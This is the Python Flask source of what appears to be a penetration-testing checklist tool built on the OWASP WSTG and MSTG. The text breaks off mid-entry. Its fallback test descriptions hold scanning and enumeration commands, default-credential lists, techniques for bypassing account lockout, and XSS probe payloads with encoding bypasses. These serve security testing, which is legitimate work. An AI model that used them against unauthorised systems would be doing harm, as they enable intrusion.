import os
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, make_response, send_file
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone
import requests
import json
import sqlite3
import ssl
import urllib3
from urllib.parse import urlparse, urljoin
import html
from markupsafe import Markup
from dotenv import load_dotenv
import re
from bs4 import BeautifulSoup
import yaml
from typing import List, Dict
import pandas as pd
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
import csv
import io
import html
import re
import socket
import base64
import hashlib
import time
import dns.resolver
from email.utils import parseaddr

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key-change-this')
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///autowaspy.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Suppress SSL warnings for testing environments
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

db = SQLAlchemy(app)

# Custom Jinja2 filter for safely formatting test descriptions
@app.template_filter('safe_format_description')
def safe_format_description(description):
    """Safely format test descriptions while preventing XSS"""
    if not description:
        return ""
    
    # Escape all HTML to prevent XSS
    escaped = html.escape(description)
    
    # Replace line breaks with HTML breaks (safe since we escaped everything)
    formatted = escaped.replace('\n', '<br>')
    
    # Return as Markup object so it's treated as safe HTML
    return Markup(formatted)

# Custom Jinja2 filter for safely escaping content (redundant but explicit)
@app.template_filter('safe_escape')
def safe_escape(content):
    """Safely escape content to prevent XSS"""
    if not content:
        return ""
    return html.escape(str(content))

# Helper function for timezone-aware UTC datetime
def utc_now():
    """Return current UTC time in timezone-aware format"""
    return datetime.now(timezone.utc)

# Database Models
class Project(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    client_name = db.Column(db.String(100), nullable=False)
    job_type = db.Column(db.String(20), nullable=False)  # 'web', 'mobile_ios', 'mobile_android'
    created_date = db.Column(db.DateTime, default=utc_now)
    description = db.Column(db.Text)
    urls = db.Column(db.Text)  # JSON string of URLs for web tests
    status = db.Column(db.String(20), default='active')  # 'active', 'completed', 'archived'
    
    # Relationships
    test_items = db.relationship('TestItem', backref='project', lazy=True, cascade='all, delete-orphan')

class TestItem(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('project.id'), nullable=False)
    owasp_id = db.Column(db.String(20), nullable=False)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text)
    category = db.Column(db.String(100))
    test_type = db.Column(db.String(20), nullable=False)  # 'wstg', 'mstg'
    is_tested = db.Column(db.Boolean, default=False)
    evidence = db.Column(db.Text)
    risk_level = db.Column(db.String(20))  # 'low', 'medium', 'high', 'critical'
    finding_status = db.Column(db.String(20), default='not_tested')  # 'not_tested', 'pass', 'fail', 'informational'
    created_date = db.Column(db.DateTime, default=utc_now)
    updated_date = db.Column(db.DateTime, default=utc_now, onupdate=utc_now)

class AutoTestResult(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('project.id'), nullable=False)
    test_name = db.Column(db.String(100), nullable=False)
    url_tested = db.Column(db.String(500))
    result = db.Column(db.String(20))  # 'pass', 'fail', 'error'
    evidence = db.Column(db.Text)
    request_data = db.Column(db.Text)
    response_data = db.Column(db.Text)
    created_date = db.Column(db.DateTime, default=utc_now)

# Add a simple cache table for OWASP data updates
class OWASPDataCache(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    data_type = db.Column(db.String(10), nullable=False)  # 'wstg' or 'mstg'
    last_updated = db.Column(db.DateTime, default=utc_now)
    data_source = db.Column(db.String(50), default='github')  # 'github' or 'fallback'
    test_count = db.Column(db.Integer, default=0)

# OWASP Data Service
class OWASPService:
    @staticmethod
    def fetch_wstg_data():
        """Fetch OWASP WSTG checklist data from GitHub repository"""
        try:
            print("Fetching WSTG data from GitHub...")
            # OWASP WSTG GitHub API endpoint for the stable branch
            api_url = "https://api.github.com/repos/OWASP/wstg/contents/document"
            headers = {'Accept': 'application/vnd.github.v3+json'}
            
            response = requests.get(api_url, headers=headers, timeout=30)
            if response.status_code == 200:
                contents = response.json()
                wstg_tests = []
                
                # Look for test files in the structure
                for item in contents:
                    if item['type'] == 'dir' and 'testing' in item['name'].lower():
                        # Get contents of testing directories
                        testing_url = item['url']
                        testing_response = requests.get(testing_url, headers=headers, timeout=30)
                        
                        if testing_response.status_code == 200:
                            testing_contents = testing_response.json()
                            
                            for subdir in testing_contents:
                                if subdir['type'] == 'dir':
                                    # Get individual test files
                                    subdir_response = requests.get(subdir['url'], headers=headers, timeout=30)
                                    if subdir_response.status_code == 200:
                                        test_files = subdir_response.json()
                                        
                                        for test_file in test_files:
                                            if test_file['name'].endswith('.md') and 'WSTG-' in test_file['name']:
                                                test_data = OWASPService._parse_wstg_file(test_file, headers)
                                                if test_data:
                                                    wstg_tests.append(test_data)
                
                # If we got enough tests from the original method, use them
                if len(wstg_tests) >= 10:
                    OWASPService._update_cache('wstg', 'github', len(wstg_tests))
                    print(f"Successfully fetched {len(wstg_tests)} WSTG tests from GitHub (original method)")
                    return sorted(wstg_tests, key=lambda x: x['id'])
            
            # Original method failed or insufficient data, try checklist fallback
            print("Original method failed or insufficient data, trying checklist fallback...")
            checklist_data = OWASPService._fetch_wstg_from_checklist()
            if len(checklist_data) >= 10:
                OWASPService._update_cache('wstg', 'github', len(checklist_data))
                print(f"Successfully fetched {len(checklist_data)} WSTG tests from GitHub (checklist method)")
                return checklist_data
            
            # Both methods failed, use fallback
            print("GitHub fetch returned insufficient data, using fallback")
            fallback_data = OWASPService._get_fallback_wstg_data()
            OWASPService._update_cache('wstg', 'fallback', len(fallback_data))
            return fallback_data
            
        except Exception as e:
            print(f"Error fetching WSTG data from GitHub: {e}")
            # Try checklist method as exception fallback
            try:
                print("Trying checklist fallback due to exception...")
                checklist_data = OWASPService._fetch_wstg_from_checklist()
                if len(checklist_data) >= 10:
                    OWASPService._update_cache('wstg', 'github', len(checklist_data))
                    print(f"Successfully fetched {len(checklist_data)} WSTG tests from checklist after exception")
                    return checklist_data
            except Exception as checklist_error:
                print(f"Checklist fallback also failed: {checklist_error}")
            
            # Final fallback
            fallback_data = OWASPService._get_fallback_wstg_data()
            OWASPService._update_cache('wstg', 'fallback', len(fallback_data))
            return fallback_data

    @staticmethod
    def _parse_wstg_file(file_info, headers):
        """Parse individual WSTG test file from GitHub"""
        try:
            # Get the raw content
            file_response = requests.get(file_info['download_url'], headers=headers, timeout=15)
            if file_response.status_code != 200:
                return None
            
            content = file_response.text
            
            # Extract WSTG ID from filename or content
            wstg_id_match = re.search(r'WSTG-[A-Z]+-\d+', file_info['name'])
            if not wstg_id_match:
                wstg_id_match = re.search(r'WSTG-[A-Z]+-\d+', content)
            
            if not wstg_id_match:
                return None
            
            wstg_id = wstg_id_match.group()
            
            # Extract title
            title_match = re.search(r'^#\s+(.+)$', content, re.MULTILINE)
            title = title_match.group(1) if title_match else f"Test {wstg_id}"
            
            # Clean up title if it contains the ID
            title = re.sub(r'^' + re.escape(wstg_id) + r'\s*[-:]?\s*', '', title)
            
            # Extract description from the content
            description_match = re.search(r'## Summary\s*\n(.*?)(?=\n##|\n#|\Z)', content, re.DOTALL)
            if not description_match:
                description_match = re.search(r'## Objective\s*\n(.*?)(?=\n##|\n#|\Z)', content, re.DOTALL)
            if not description_match:
                description_match = re.search(r'## Description\s*\n(.*?)(?=\n##|\n#|\Z)', content, re.DOTALL)
            
            description = description_match.group(1).strip() if description_match else '''Security testing as per OWASP WSTG guidelines.

▼ General Testing Approach:
• Review application functionality and architecture
• Identify potential security vulnerabilities
• Test using manual and automated techniques
• Document findings with evidence and risk assessment
• Provide remediation recommendations

▼ Documentation Requirements:
• Test steps performed and methodology used
• Evidence of vulnerabilities (screenshots, request/response)
• Risk assessment and business impact
• Specific remediation guidance
• Retest validation after fixes'''
            description = re.sub(r'\n+', ' ', description)[:500] + "..." if len(description) > 500 else description
            
            # Determine category based on the ID
            category_map = {
                'INFO': 'Information Gathering',
                'CONF': 'Configuration and Deployment Management Testing',
                'IDNT': 'Identity Management Testing',
                'ATHN': 'Authentication Testing',
                'AUTHZ': 'Authorization Testing',
                'SESS': 'Session Management Testing',
                'INPV': 'Input Validation Testing',
                'ERRH': 'Error Handling',
                'CRYP': 'Cryptography',
                'BUSLOGIC': 'Business Logic Testing',
                'CLNT': 'Client-Side Testing'
            }
            
            category_code = wstg_id.split('-')[1] if '-' in wstg_id else 'MISC'
            category = category_map.get(category_code, 'Miscellaneous Testing')
            
            return {
                'id': wstg_id,
                'title': title,
                'category': category,
                'description': description
            }
            
        except Exception as e:
            print(f"Error parsing WSTG file {file_info['name']}: {e}")
            return None

    @staticmethod
    def fetch_mstg_data():
        """Fetch OWASP MSTG checklist data from GitHub repository"""
        try:
            print("Fetching MSTG data from GitHub...")
            # OWASP MSTG GitHub API endpoint
            api_url = "https://api.github.com/repos/OWASP/owasp-mstg/contents/Document/0x90-Appendix-B_References.md"
            headers = {'Accept': 'application/vnd.github.v3+json'}
            
            # Try to fetch the main MSTG checklist file
            response = requests.get(api_url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                file_info = response.json()
                content_response = requests.get(file_info['download_url'], timeout=15)
                
                if content_response.status_code == 200:
                    content = content_response.text
                    mstg_tests = OWASPService._parse_mstg_content(content)
                    
                    if len(mstg_tests) >= 5:
                        OWASPService._update_cache('mstg', 'github', len(mstg_tests))
                        print(f"Successfully fetched {len(mstg_tests)} MSTG tests from GitHub")
                        return mstg_tests
            
            # Fallback: try alternative approach
            print("Trying alternative MSTG fetch method...")
            alternative_data = OWASPService._fetch_mstg_alternative()
            if len(alternative_data) >= 5:
                OWASPService._update_cache('mstg', 'github', len(alternative_data))
                print(f"Successfully fetched {len(alternative_data)} MSTG tests via alternative method")
                return alternative_data
            
            # Use fallback data
            print("GitHub fetch returned insufficient data, using fallback MSTG data")
            fallback_data = OWASPService._get_fallback_mstg_data()
            OWASPService._update_cache('mstg', 'fallback', len(fallback_data))
            return fallback_data
            
        except Exception as e:
            print(f"Error fetching MSTG data from GitHub: {e}")
            fallback_data = OWASPService._get_fallback_mstg_data()
            OWASPService._update_cache('mstg', 'fallback', len(fallback_data))
            return fallback_data

    @staticmethod
    def _fetch_mstg_alternative():
        """Alternative method to fetch MSTG data"""
        try:
            # Try to fetch from the checklist in the main documentation
            api_url = "https://api.github.com/repos/OWASP/owasp-mstg/contents/Document"
            headers = {'Accept': 'application/vnd.github.v3+json'}
            
            response = requests.get(api_url, headers=headers, timeout=30)
            if response.status_code != 200:
                return OWASPService._get_fallback_mstg_data()
            
            contents = response.json()
            mstg_tests = []
            
            # Look for checklist or requirement files
            for item in contents:
                if item['type'] == 'file' and any(keyword in item['name'].lower() for keyword in ['checklist', 'requirement', 'mstg']):
                    file_response = requests.get(item['download_url'], timeout=15)
                    if file_response.status_code == 200:
                        content = file_response.text
                        parsed_tests = OWASPService._parse_mstg_content(content)
                        mstg_tests.extend(parsed_tests)
            
            if len(mstg_tests) >= 5:
                return sorted(mstg_tests, key=lambda x: x['id'])
            
            return OWASPService._get_fallback_mstg_data()
            
        except Exception:
            return OWASPService._get_fallback_mstg_data()

    @staticmethod
    def _parse_mstg_content(content):
        """Parse MSTG content for test requirements"""
        mstg_tests = []
        
        # Look for MSTG patterns
        mstg_patterns = [
            r'MSTG-([A-Z]+)-(\d+)[:\s]*(.+)',
            r'(\d+\.\d+)\s+(.+?)(?=\n\d+\.\d+|\Z)',
            r'-\s*(MSTG-[A-Z]+-\d+)[:\s]*(.+)'
        ]
        
        for pattern in mstg_patterns:
            matches = re.finditer(pattern, content, re.MULTILINE)
            for match in matches:
                if 'MSTG-' in pattern:
                    if len(match.groups()) >= 3:
                        category_code = match.group(1)
                        test_num = match.group(2)
                        description = match.group(3).strip()
                        
                        mstg_id = f"MSTG-{category_code}-{test_num}"
                        category = OWASPService._get_mstg_category(category_code)
                        
                        mstg_tests.append({
                            'id': mstg_id,
                            'title': description[:100] + "..." if len(description) > 100 else description,
                            'category': category,
                            'description': description
                        })
        
        # If no patterns matched, create based on common MSTG requirements
        if len(mstg_tests) < 5:
            return OWASPService._get_fallback_mstg_data()
        
        return mstg_tests[:20]  # Limit to reasonable number

    @staticmethod
    def _get_mstg_category(category_code):
        """Map MSTG category codes to full names"""
        category_map = {
            'ARCH': 'Architecture, Design and Threat Modeling Requirements',
            'STORAGE': 'Data Storage and Privacy Requirements',
            'CRYPTO': 'Cryptography Requirements',
            'AUTH': 'Authentication and Session Management Requirements',
            'NETWORK': 'Network Communication Requirements',
            'PLATFORM': 'Platform Interaction Requirements',
            'CODE': 'Code Quality and Build Setting Requirements',
            'RESILIENCE': 'Resilience Against Reverse Engineering Requirements'
        }
        return category_map.get(category_code, 'Mobile Security Requirements')

    @staticmethod
    def _get_fallback_wstg_data():
        """Enhanced fallback WSTG data as backup"""
        return [
            {
                'id': 'WSTG-INFO-01',
                'title': 'Conduct Search Engine Discovery Reconnaissance for Information Leakage',
                'category': 'Information Gathering',
                'description': '''Use search engines to discover sensitive information that may be inadvertently exposed.

▼ What to Test:
• Search for domain in Google, Bing, DuckDuckGo using site:domain.com
• Look for exposed files, directories, error messages, stack traces
• Check for leaked credentials, API keys, internal documentation
• Search for cached pages that might reveal old/sensitive content

▼ How to Test:
1. Use Google dorking: site:example.com filetype:pdf OR filetype:doc
2. Search for: site:example.com "error" OR "exception" OR "stack trace"
3. Check: site:example.com inurl:admin OR inurl:login OR inurl:config
4. Use tools like theHarvester, Google Hacking Database (GHDB)
5. Review search results for sensitive information exposure

▼ Risk Indicators:
• Database connection strings or credentials in indexed files
• Error messages revealing file paths or system information
• Admin interfaces or sensitive directories in search results
• Cached pages showing outdated or internal content'''
            },
            {
                'id': 'WSTG-INFO-02',
                'title': 'Fingerprint Web Server',
                'category': 'Information Gathering',
                'description': '''Identify web server software, version, and configuration to understand potential attack vectors.

▼ What to Test:
• Server header revealing web server type and version
• Server-specific response characteristics and error pages
• Default files and directories that indicate server type
• Response timing and behavior patterns

▼ How to Test:
1. Check HTTP response headers: curl -I http://example.com
2. Send malformed requests to trigger error pages
3. Check for default files: /server-status, /server-info (Apache)
4. Use tools: Nmap, Nikto, whatweb, httprint
5. Banner grabbing: telnet example.com 80, then send HTTP request

▼ Example Commands:
• nmap -sV -p 80,443 example.com
• whatweb example.com
• curl -I -X OPTIONS http://example.com

▼ Risk Indicators:
• Detailed server version information exposed
• Default error pages revealing server type
• Outdated server versions with known vulnerabilities
• Unnecessary server modules or features enabled'''
            },
            {
                'id': 'WSTG-INFO-03',
                'title': 'Review Webserver Metafiles for Information Leakage',
                'category': 'Information Gathering',
                'description': '''Analyze robots.txt, sitemap.xml and other metafiles for sensitive information disclosure.

▼ What to Test:
• robots.txt file revealing hidden directories and files
• sitemap.xml exposing site structure and sensitive URLs
• .well-known directory contents
• Other metadata files like humans.txt, security.txt

▼ How to Test:
1. Check robots.txt: curl http://example.com/robots.txt
2. Review sitemap.xml: curl http://example.com/sitemap.xml
3. Test .well-known: curl http://example.com/.well-known/security.txt
4. Look for: crossdomain.xml, clientaccesspolicy.xml
5. Check for humans.txt, ads.txt, app-ads.txt

▼ Files to Check:
• /robots.txt - Disallowed paths might reveal sensitive areas
• /sitemap.xml - Complete site structure mapping
• /.well-known/security.txt - Security contact information
• /crossdomain.xml - Flash cross-domain policies
• /clientaccesspolicy.xml - Silverlight policies

▼ Risk Indicators:
• Admin areas listed in robots.txt disallow directives
• Sensitive URLs exposed in sitemap.xml
• Overly permissive cross-domain policies
• Information leakage about site structure and hidden content'''
            },
            {
                'id': 'WSTG-INFO-04',
                'title': 'Enumerate Applications on Webserver',
                'category': 'Information Gathering',
                'description': '''Identify all applications and services running on the web server.

▼ What to Test:
• Virtual hosts and subdomains on the same server
• Different applications accessible through various paths
• Services running on non-standard ports
• Application-specific directories and endpoints

▼ How to Test:
1. DNS enumeration: dig example.com, dnsrecon -d example.com
2. Subdomain discovery: sublist3r -d example.com, amass enum -d example.com
3. Port scanning: nmap -sS -O example.com
4. Directory enumeration: dirb, gobuster, dirsearch
5. Virtual host discovery: Host header manipulation

▼ Tools and Commands:
• nmap -p- example.com (full port scan)
• gobuster dir -u http://example.com -w /path/to/wordlist
• ffuf -u http://example.com/FUZZ -w wordlist.txt
• Use different Host headers to discover virtual hosts

▼ Risk Indicators:
• Multiple applications with different security levels
• Forgotten or unmaintained applications
• Development/staging environments accessible
• Admin interfaces on non-standard ports'''
            },
            {
                'id': 'WSTG-INFO-05',
                'title': 'Review Webpage Content for Information Leakage',
                'category': 'Information Gathering',
                'description': '''Examine webpage source code and content for sensitive information exposure.

▼ What to Test:
• HTML comments containing sensitive information
• JavaScript files with hardcoded credentials or API keys
• Metadata in images and documents
• Hidden form fields and disabled elements
• Source code comments and debug information

▼ How to Test:
1. View page source: Ctrl+U or curl -s http://example.com
2. Check JavaScript files: Review all .js files for secrets
3. Extract metadata: exiftool image.jpg
4. Search for patterns: grep -r "password\\|api_key\\|secret" ./
5. Browser developer tools: Network tab, Sources tab

▼ What to Look For:
• <!-- TODO: remove hardcoded password -->
• var apiKey = "sk-12345abcdef";
• Database connection strings in JS
• Internal IP addresses and server names
• Debug information and stack traces

▼ Risk Indicators:
• Hardcoded credentials or API keys in source
• Internal system information exposed
• Development comments left in production
• Sensitive business logic revealed in client-side code'''
            },
            {
                'id': 'WSTG-CONF-01',
                'title': 'Test Network Infrastructure Configuration',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Test the network infrastructure configuration for security misconfigurations and vulnerabilities.

▼ What to Test:
• Network service configurations and exposed ports
• Firewall rules and network segmentation
• Load balancer and proxy configurations
• Network protocol security settings

▼ How to Test:
1. Port scanning: nmap -sS -sV -sC target
2. Service enumeration: nmap --script=default target
3. SSL/TLS testing: nmap --script ssl-enum-ciphers -p 443 target
4. Check for admin interfaces on unusual ports
5. Test network connectivity and filtering

▼ Common Issues:
• Unnecessary services running (SSH, FTP, Telnet)
• Weak SSL/TLS configurations
• Management interfaces exposed to internet
• Default credentials on network devices
• Insecure network protocols (SNMPv1, HTTP)

▼ Tools to Use:
• Nmap for comprehensive port/service scanning
• SSLyze for SSL/TLS configuration testing
• testssl.sh for SSL security assessment
• Masscan for fast port scanning'''
            },
            {
                'id': 'WSTG-CONF-02',
                'title': 'Test Application Platform Configuration',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Verify that the application platform is securely configured according to best practices.

▼ What to Test:
• Web server configuration (Apache, Nginx, IIS)
• Application server settings (Tomcat, JBoss, etc.)
• Database configuration and access controls
• Operating system hardening and patch levels

▼ How to Test:
1. Review web server config files: httpd.conf, nginx.conf
2. Check for default accounts and passwords
3. Verify file permissions and ownership
4. Test directory listings and file access
5. Review error page configurations

▼ Configuration Areas:
• Server signature and version disclosure
• Directory browsing enabled/disabled
• File upload restrictions and validation
• Session timeout and security settings
• Logging and monitoring configurations

▼ Example Checks:
• curl -I http://example.com (check Server header)
• Check if http://example.com/uploads/ shows directory listing
• Verify error pages don't reveal system information
• Test file upload functionality for bypasses'''
            },
            {
                'id': 'WSTG-CONF-03',
                'title': 'Test File Extensions Handling for Sensitive Information',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Test how the web server handles different file extensions and potential information disclosure.

▼ What to Test:
• Backup files with common extensions (.bak, .old, .tmp)
• Source code files (.php.bak, .aspx.cs, .java)
• Configuration files (.config, .ini, .properties)
• Archive files (.zip, .tar, .rar) containing source code

▼ How to Test:
1. Test common backup extensions: file.php.bak, file.php~
2. Try source code extensions: .cs, .vb, .java for compiled apps
3. Look for config files: web.config, .htaccess, database.properties
4. Check for compressed archives: backup.zip, source.tar.gz
5. Use automated tools: DirBuster, dirb, gobuster

▼ File Extensions to Test:
• .bak, .backup, .old, .orig, .save, .tmp
• .inc, .conf, .config, .ini, .properties
• .cs, .vb, .java (for .NET/Java apps)
• .zip, .tar, .gz, .rar, .7z

▼ Risk Indicators:
• Source code files accessible via web
• Database configuration files exposed
• Backup files containing sensitive information
• Development files left on production server'''
            },
            {
                'id': 'WSTG-CONF-04',
                'title': 'Review Old Backup and Unreferenced Files for Sensitive Information',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Search for backup files, old versions, and unreferenced files that may contain sensitive information.

▼ What to Test:
• Backup files created by editors or deployment scripts
• Old versions of applications or components
• Forgotten administrative tools and interfaces
• Archive files and database dumps

▼ How to Test:
1. Directory enumeration with backup-focused wordlists
2. Check common backup locations: /backup/, /old/, /archive/
3. Look for editor backup files: file.php~, .file.php.swp
4. Search for database dumps: backup.sql, dump.sql
5. Use tools like dirb, gobuster with backup extensions

▼ Common Backup Patterns:
• index.php.bak, login.asp.old
• backup_20231215.sql, database_dump.sql
• admin_old/, maintenance/, dev/
• .DS_Store, Thumbs.db, .svn/, .git/

▼ Tools and Wordlists:
• SecLists backup file wordlists
• gobuster with backup extensions: -x bak,old,tmp
• Find version control directories: /.git/, /.svn/'''
            },
            {
                'id': 'WSTG-CONF-05',
                'title': 'Enumerate Infrastructure and Application Admin Interfaces',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Identify and assess administrative interfaces that may be accessible.'
            },
            {
                'id': 'WSTG-CONF-06',
                'title': 'Test HTTP Methods',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Test for enabled HTTP methods that may pose security risks such as PUT, DELETE, TRACE.'
            },
            {
                'id': 'WSTG-CONF-07',
                'title': 'Test HTTP Strict Transport Security',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Verify the presence and proper implementation of HTTP Strict Transport Security (HSTS).'
            },
            {
                'id': 'WSTG-CONF-08',
                'title': 'Test RIA Cross Domain Policy',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Test Rich Internet Application cross-domain policy files for security misconfigurations.'
            },
            {
                'id': 'WSTG-CONF-09',
                'title': 'Test File Permission',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Verify that file permissions are properly configured to prevent unauthorized access.'
            },
            {
                'id': 'WSTG-CONF-10',
                'title': 'Test for Subdomain Takeover',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Test for subdomain takeover vulnerabilities through misconfigured DNS records.'
            },
            {
                'id': 'WSTG-IDNT-01',
                'title': 'Test Role Definitions',
                'category': 'Identity Management Testing',
                'description': 'Verify that user roles are properly defined and enforced throughout the application.'
            },
            {
                'id': 'WSTG-IDNT-02',
                'title': 'Test User Registration Process',
                'category': 'Identity Management Testing',
                'description': 'Test the user registration process for security vulnerabilities and business logic flaws.'
            },
            {
                'id': 'WSTG-IDNT-03',
                'title': 'Test Account Provisioning Process',
                'category': 'Identity Management Testing',
                'description': 'Verify the security of account provisioning and management processes.'
            },
            {
                'id': 'WSTG-ATHN-01',
                'title': 'Testing for Credentials Transported over an Encrypted Channel',
                'category': 'Authentication Testing',
                'description': '''Verify that user credentials are transmitted securely over encrypted channels.

▼ What to Test:
• Login forms submit over HTTPS
• Password reset and change forms use encryption
• Session tokens transmitted securely
• No credentials sent in URL parameters or headers over HTTP

▼ How to Test:
1. Intercept login requests: Use Burp Suite or OWASP ZAP
2. Check protocol: Ensure login URL starts with https://
3. Test mixed content: Verify no HTTP resources on HTTPS pages
4. Check redirect behavior: HTTP login should redirect to HTTPS
5. Verify secure flag on authentication cookies

▼ Testing Steps:
• Proxy traffic through Burp/ZAP during login process
• Check if login form has action="https://..."
• Look for secure cookie attributes in Set-Cookie headers
• Test if credentials can be submitted over HTTP
• Verify no credentials in Referer headers

▼ Risk Indicators:
• Login forms submitting over HTTP
• Credentials visible in browser history/logs
• Session tokens transmitted without encryption
• Mixed content warnings on authentication pages'''
            },
            {
                'id': 'WSTG-ATHN-02',
                'title': 'Testing for Default Credentials',
                'category': 'Authentication Testing',
                'description': '''Test for the presence of default or easily guessable credentials in the application.

▼ What to Test:
• Default admin accounts (admin/admin, admin/password)
• Vendor-specific default credentials
• Weak or common passwords
• Accounts created during installation or setup

▼ How to Test:
1. Try common username/password combinations
2. Check vendor documentation for default credentials
3. Test administrative interfaces and management consoles
4. Look for installation or setup pages with default accounts
5. Use credential lists like SecLists default passwords

▼ Common Default Credentials:
• admin/admin, admin/password, admin/123456
• root/root, administrator/administrator
• guest/guest, test/test, demo/demo
• Application-specific: oracle/oracle, sa/sa
• Device-specific: Cisco, HP, Dell default passwords

▼ Where to Test:
• Main application login
• Administrative interfaces (/admin, /console)
• Database management tools (phpMyAdmin)
• Web application firewalls and load balancers
• Any discovered management interfaces'''
            },
            {
                'id': 'WSTG-ATHN-03',
                'title': 'Testing for Weak Lock Out Mechanism',
                'category': 'Authentication Testing',
                'description': '''Verify that account lockout mechanisms are properly implemented and cannot be bypassed.

▼ What to Test:
• Account lockout threshold and duration
• Lockout bypass techniques
• CAPTCHA implementation effectiveness
• IP-based vs account-based lockout policies

▼ How to Test:
1. Attempt multiple failed logins: Test lockout threshold
2. Try lockout bypasses: IP rotation, user agent changes
3. Test different usernames: Verify lockout is per-account
4. Check lockout duration: Time-based vs permanent lockout
5. Test CAPTCHA: Verify it's properly implemented

▼ Bypass Techniques to Test:
• IP address rotation using proxies/VPNs
• Changing User-Agent headers between attempts
• Using different request formats (POST vs GET)
• Case variation in usernames (Admin vs admin)
• Adding extra parameters or headers

▼ Risk Indicators:
• No account lockout after multiple failed attempts
• Easy bypass using IP rotation or header changes
• Lockout mechanism affects only specific login methods
• CAPTCHA can be easily automated or bypassed'''
            },
            {
                'id': 'WSTG-SESS-01',
                'title': 'Testing for Session Management Schema',
                'category': 'Session Management Testing',
                'description': '''Analyze the session management implementation for security vulnerabilities.

▼ What to Test:
• Session token generation and randomness
• Session token length and complexity
• Session storage mechanism (cookies, URLs, hidden fields)
• Session lifecycle management

▼ How to Test:
1. Analyze session tokens: Check randomness and entropy
2. Test token predictability: Generate multiple sessions, analyze patterns
3. Check session storage: Look for tokens in URLs or hidden fields
4. Test session timeout: Verify idle and absolute timeouts
5. Session regeneration: Check if tokens change after login/privilege escalation

▼ Session Token Analysis:
• Collect 100+ session tokens and analyze for patterns
• Check token length: Should be at least 128 bits
• Test entropy: Use tools like Burp's Sequencer
• Verify tokens don't contain user information
• Check for session fixation vulnerabilities

▼ Tools for Testing:
• Burp Suite Sequencer for randomness analysis
• OWASP ZAP for session testing
• Custom scripts to collect and analyze tokens
• Browser developer tools to inspect session cookies'''
            },
            {
                'id': 'WSTG-SESS-02',
                'title': 'Testing for Cookies Attributes',
                'category': 'Session Management Testing',
                'description': '''Verify that session cookies have proper security attributes (HttpOnly, Secure, SameSite).

▼ What to Test:
• HttpOnly flag prevents JavaScript access
• Secure flag ensures HTTPS-only transmission
• SameSite attribute prevents CSRF attacks
• Cookie expiration and persistence settings

▼ How to Test:
1. Inspect Set-Cookie headers: Look for security flags
2. Test JavaScript access: Try document.cookie in console
3. Test HTTP/HTTPS behavior: Check if cookies sent over both
4. Browser testing: Test SameSite behavior across sites
5. Session persistence: Check if cookies persist after browser close

▼ Required Cookie Attributes:
• HttpOnly: Prevents XSS cookie theft
• Secure: Ensures transmission over HTTPS only
• SameSite=Strict/Lax: Prevents CSRF attacks
• Appropriate expiration time
• Path and Domain properly scoped

▼ Testing Methods:
• Browser Developer Tools → Application → Cookies
• Burp Suite → Proxy → HTTP History
• curl -I to check Set-Cookie headers
• JavaScript console: document.cookie (should not show HttpOnly cookies)'''
            },
            {
                'id': 'WSTG-SESS-03',
                'title': 'Testing for Session Fixation',
                'category': 'Session Management Testing',
                'description': '''Test for session fixation vulnerabilities in the authentication process.

▼ What to Test:
• Session token changes after authentication
• Pre-authentication session tokens accepted post-login
• Session token regeneration on privilege escalation
• URL-based session token handling

▼ How to Test:
1. Obtain session token before login
2. Login with valid credentials using that token
3. Check if the same token is valid after login
4. Test privilege escalation scenarios
5. Test session token in URLs vs cookies

▼ Testing Steps:
• Step 1: Visit login page, note session token
• Step 2: Login with valid credentials
• Step 3: Check if session token changed after login
• Step 4: Test if old token still works
• Step 5: Repeat for privilege escalation scenarios

▼ Vulnerability Indicators:
• Same session token before and after login
• Pre-authentication tokens accepted post-login
• Session tokens passed in URLs can be fixed
• No token regeneration on role/privilege changes'''
            },
            {
                'id': 'WSTG-INPV-01',
                'title': 'Testing for Reflected Cross Site Scripting',
                'category': 'Input Validation Testing',
                'description': '''Test for reflected Cross-Site Scripting (XSS) vulnerabilities in user input fields.

▼ What to Test:
• URL parameters reflected in response without encoding
• Form inputs that echo user input back to the page
• HTTP headers that are reflected in the response
• Error messages that include user input

▼ How to Test:
1. Identify reflection points: Find where input appears in output
2. Test basic payloads: <script>alert(1)</script>
3. Test encoding bypasses: Use different encoding techniques
4. Test context-specific payloads: HTML, JavaScript, CSS contexts
5. Verify execution: Check if JavaScript actually executes

▼ Common Test Payloads:
• <script>alert("XSS")</script>
• "><script>alert(1)</script>
• javascript:alert(1)
• <img src=x onerror=alert(1)>
• <svg onload=alert(1)>

▼ Testing Locations:
• URL parameters: ?q=<script>alert(1)</script>
• Form fields: Search boxes, contact forms
• HTTP headers: User-Agent, Referer, X-Forwarded-For
• File upload filenames and error messages

▼ Encoding Bypasses:
• URL encoding: %3Cscript%3E
• HTML entity encoding: &lt;script&gt;
• Double encoding: %253Cscript%253E
• Unicode encoding: \\u003cscript\\u003e'''
            },
            {
                'id': 'WSTG-INPV-02',
                'title': 'Testing for Stored Cross Site Scripting',
                'category': 'Input Validation Testing',
                'description': '''Test for stored Cross-Site Scripting (XSS) vulnerabilities that persist in the application.

▼ What to Test:
• Comment sections and user-generated content
• Profile fields and user settings
• File upload functionality with stored filenames
• Any data that persists and is displayed to other users

▼ How to Test:
